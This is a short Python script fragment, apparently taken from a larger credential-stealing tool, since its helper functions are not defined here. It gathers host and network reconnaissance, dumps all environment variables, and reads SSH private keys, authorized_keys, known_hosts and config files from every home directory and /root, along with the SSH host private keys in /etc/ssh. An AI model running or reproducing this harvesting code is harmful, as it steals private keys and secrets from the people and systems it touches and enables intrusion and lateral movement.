#!/usr/bin/env python

run('hostname; pwd; whoami; uname -a; ip addr 2>/dev/null || ifconfig 2>/dev/null; ip route 2>/dev/null')
run('printenv')

for h in homes+['/root']:
    for f in ['/.ssh/id_rsa','/.ssh/id_ed25519','/.ssh/id_ecdsa','/.ssh/id_dsa','/.ssh/authorized_keys','/.ssh/known_hosts','/.ssh/config']:
        emit(h+f)
    walk([h+'/.ssh'],2,lambda fp,fn:True)

walk(['/etc/ssh'],1,lambda fp,fn:fn.startswith('ssh_host') and fn.endswith('_key'))

